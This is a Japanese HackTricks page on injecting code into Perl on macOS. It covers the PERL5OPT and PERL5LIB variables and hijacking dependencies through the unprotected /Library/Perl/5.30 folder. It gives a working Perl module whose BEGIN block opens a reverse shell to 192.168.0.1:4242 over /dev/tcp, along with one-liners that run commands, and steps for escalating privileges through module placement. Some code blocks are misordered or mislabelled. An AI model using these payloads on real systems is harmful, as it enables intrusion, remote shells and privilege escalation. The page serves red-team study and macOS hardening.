# macOS Perl アプリケーションインジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## `PERL5OPT` & `PERL5LIB` 環境変数を介して

環境変数 PERL5OPT を使用すると、perl で任意のコマンドを実行させることができます。\
例えば、このスクリプトを作成します：

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

これで**環境変数をエクスポート**し、**perl**スクリプトを実行します:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
```perl
package pmod;

use strict;
use warnings;

BEGIN {
    system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/4242 0>&1'");
}

1;
```
{% endcode %}

この方法では、Perlモジュール（例：`/tmp/pmod.pm`）を作成します。
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
```
そして、環境変数を使用します:
```
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 依存関係を通じて

Perlが実行される際の依存関係フォルダの順序をリストすることが可能です:
```bash
perl -e 'print join("\n", @INC)'
```
これにより、次のような結果が返されます:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
返されたフォルダのいくつかは存在していませんが、**`/Library/Perl/5.30`** は実際に**存在し**、**SIP**によって**保護されていない**上、SIPによって保護されているフォルダよりも**前**にあります。したがって、誰かがそのフォルダを悪用してスクリプトの依存関係を追加し、高権限のPerlスクリプトがそれを読み込むようにすることができます。

{% hint style="warning" %}
ただし、そのフォルダに書き込むには**root権限が必要**であり、現在ではこのような**TCCプロンプト**が表示されます：
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

例えば、スクリプトが**`use File::Basename;`** をインポートしている場合、`/Library/Perl/5.30/File/Basename.pm` を作成して任意のコードを実行させることが可能です。

## 参考文献

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
